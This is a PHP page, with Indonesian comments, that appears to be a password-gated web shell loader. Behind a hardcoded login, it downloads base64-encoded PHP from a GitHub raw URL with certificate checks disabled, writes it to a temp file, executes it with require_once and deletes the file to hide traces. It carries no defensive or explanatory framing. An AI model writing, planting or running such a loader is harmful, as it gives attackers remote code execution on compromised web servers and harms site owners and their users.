<html>
	<head>
	<link href="https://cdn.jsdelivr.net/npm/tailwindcss@2.2.7/dist/tailwind.min.css" rel="stylesheet">
	</head>
	<body>
<?php
session_start(); // Mulai atau lanjutkan sesi
error_reporting(0);
function show_login_page() {
    echo '<form method="post" action="" class="max-w-md mx-auto my-4 p-4 bg-gray-200 rounded-lg shadow-lg">';
    echo '<div class="mb-4">';
    echo '<label for="username" class="block text-gray-700 font-bold">Username:</label>';
    echo '<input type="text" name="username" id="username" class="border rounded px-3 py-2 w-full" required>';
    echo '</div>';
    echo '<div class="mb-4">';
    echo '<label for="password" class="block text-gray-700 font-bold">Password:</label>';
    echo '<input type="password" name="password" id="password" class="border rounded px-3 py-2 w-full" required>';
    echo '</div>';
    echo '<input type="submit" value="Login" class="bg-blue-500 hover:bg-blue-700 text-white font-bold py-2 px-4 rounded">';
    echo '</form>';
}


// Inisialisasi variabel yang akan menampung pesan kesalahan
$error_message = '';

// Check if the form is submitted
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    $username = $_POST["username"];
    $password = $_POST["password"];

    // Anda sebaiknya menggantikan ini dengan logika otentikasi yang sesungguhnya
    $validUsername = "null";
    $validPassword = "1234";

    if ($username === $validUsername && $password === $validPassword) {
        // Simpan status login di sesi
        $_SESSION["logged_in"] = true;
    } else {
        $error_message = "Invalid username or password. Please try again.";
    }
}

// Check if the user is logged in
if (!isset($_SESSION["logged_in"]) || $_SESSION["logged_in"] !== true) {
    // Jika tidak login, tampilkan halaman login
    show_login_page();

    // Tampilkan pesan kesalahan jika ada
    if (!empty($error_message)) {
        echo '<p>' . $error_message . '</p>';
    }
} else {
    // Jika sudah login, tampilkan konten
    if ($_SERVER["REQUEST_METHOD"] == "GET" && isset($_GET["logout"])) {
        // Jika parameter GET "logout" ada, jalankan fungsi logout
        fungsi_logout();
    }
    ?>
   <?php
function get_contents($url) {
    $ch = curl_init($url);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
    curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
    curl_setopt($ch, CURLOPT_USERAGENT, "Mozilla/5.0 (Windows NT 6.1; rv:32.0) Gecko/20100101 Firefox/32.0");
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
    curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
    $result = curl_exec($ch);
    curl_close($ch);
    return $result;
}

$url = 'https://raw.githubusercontent.com/nullcy0/tested/main/geblay.php';
$encoded_code = get_contents($url);
$decoded_code = base64_decode($encoded_code);

$tempFile = tempnam(sys_get_temp_dir(), 'tmp_php_');
file_put_contents($tempFile, $decoded_code);


require_once $tempFile;
unlink($tempFile); 
?>
    </div>
    <center>
    <a href="?logout=1"><h1>Logout</h1></a> <!-- Tambahkan parameter GET untuk logout -->
    </center>
    <?php
}

function fungsi_logout() {
    session_unset(); // Menghapus semua variabel sesi
    session_destroy(); // Menghancurkan sesi
    header('Location: ' . $_SERVER['REQUEST_URI']); // Redirect ke halaman ini
    exit();
}
?>
</body>
	</html>
